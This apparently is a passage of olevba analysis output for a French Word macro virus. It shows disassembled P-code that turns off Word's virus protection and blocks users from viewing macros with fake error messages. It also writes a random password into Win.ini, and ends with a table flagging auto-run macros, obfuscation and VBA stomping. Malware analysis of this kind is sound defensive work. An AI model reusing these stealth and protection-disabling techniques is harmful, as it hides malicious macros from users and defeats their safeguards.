' 	ArgsMemCall Show 0x0000 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	Label Fin 
' Line #160:
' 	Label ErrorFP 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub FileTemplates())
' Line #163:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #164:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #165:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #166:
' 	OnError ErrorFT 
' Line #167:
' 	LitStr 0x001B "Espace Mémoire Insuffisant."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #168:
' 	Label ErrorFT 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Private Sub MDPV97())
' Line #171:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #172:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #173:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #174:
' 	OnError ErrorMDPV97 
' Line #175:
' 	ArgsCall Read 0x0000 
' Line #176:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #177:
' 	Ld Rnd 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #178:
' 	Ld N$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	IfBlock 
' Line #179:
' 	LitStr 0x0001 "A"
' 	St Valeur$ 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	Ld N$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	IfBlock 
' Line #182:
' 	LitStr 0x0001 "B"
' 	St Valeur$ 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld N$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	IfBlock 
' Line #185:
' 	LitStr 0x0001 "C"
' 	St Valeur$ 
' Line #186:
' 	EndIfBlock 
' Line #187:
' 	Ld N$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	IfBlock 
' Line #188:
' 	LitStr 0x0001 "D"
' 	St Valeur$ 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	Ld N$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitStr 0x0001 "E"
' 	St Valeur$ 
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	Ld N$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	IfBlock 
' Line #194:
' 	LitStr 0x0001 "F"
' 	St Valeur$ 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	Ld N$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	IfBlock 
' Line #197:
' 	LitStr 0x0001 "G"
' 	St Valeur$ 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	Ld N$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	IfBlock 
' Line #200:
' 	LitStr 0x0001 "H"
' 	St Valeur$ 
' Line #201:
' 	EndIfBlock 
' Line #202:
' 	Ld N$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	IfBlock 
' Line #203:
' 	LitStr 0x0001 "I"
' 	St Valeur$ 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	Ld N$ 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	IfBlock 
' Line #206:
' 	LitStr 0x0001 "J"
' 	St Valeur$ 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	Ld N$ 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	IfBlock 
' Line #209:
' 	LitStr 0x0001 "§"
' 	St Valeur$ 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	Ld N$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	IfBlock 
' Line #212:
' 	LitStr 0x0001 "*"
' 	St Valeur$ 
' Line #213:
' 	EndIfBlock 
' Line #214:
' 	Ld N$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #215:
' 	LitStr 0x0001 "¤"
' 	St Valeur$ 
' Line #216:
' 	EndIfBlock 
' Line #217:
' 	Ld N$ 
' 	LitStr 0x0002 "14"
' 	Eq 
' 	IfBlock 
' Line #218:
' 	LitStr 0x0001 "@"
' 	St Valeur$ 
' Line #219:
' 	EndIfBlock 
' Line #220:
' 	Ld N$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #221:
' 	LitStr 0x0001 "%"
' 	St Valeur$ 
' Line #222:
' 	EndIfBlock 
' Line #223:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St a$ 
' 	EndIf 
' Line #224:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St B$ 
' 	EndIf 
' Line #225:
' 	Ld i 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St c$ 
' 	EndIf 
' Line #226:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St d$ 
' 	EndIf 
' Line #227:
' 	Ld i 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St e$ 
' 	EndIf 
' Line #228:
' 	Ld i 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St False$ 
' 	EndIf 
' Line #229:
' 	Ld i 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St g$ 
' 	EndIf 
' Line #230:
' 	Ld i 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Valeur$ 
' 	St h$ 
' 	EndIf 
' Line #231:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #232:
' 	Ld a$ 
' 	Ld B$ 
' 	Add 
' 	Ld c$ 
' 	Add 
' 	Ld d$ 
' 	Add 
' 	Ld e$ 
' 	Add 
' 	Ld False$ 
' 	Add 
' 	Ld g$ 
' 	Add 
' 	Ld h$ 
' 	Add 
' 	St Total$ 
' Line #233:
' 	LitStr 0x000A "MotDePasse"
' 	LitStr 0x0006 "Valeur"
' 	Ld Total$ 
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #234:
' 	Label ErrorMDPV97 
' Line #235:
' 	EndSub 
' Line #236:
' 	FuncDefn (Sub ToolsMacro())
' Line #237:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #238:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #239:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #240:
' 	OnError ErrorTM 
' Line #241:
' 	LitStr 0x003F "Une erreur est survenu lors de l'utilisation de cette fonction."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #242:
' 	Label ErrorTM 
' Line #243:
' 	EndSub 
' Line #244:
' 	FuncDefn (Sub ViewVBCode())
' Line #245:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #246:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #247:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #248:
' 	OnError ErrorVVBC 
' Line #249:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #250:
' 	Label ErrorVVBC 
' Line #251:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

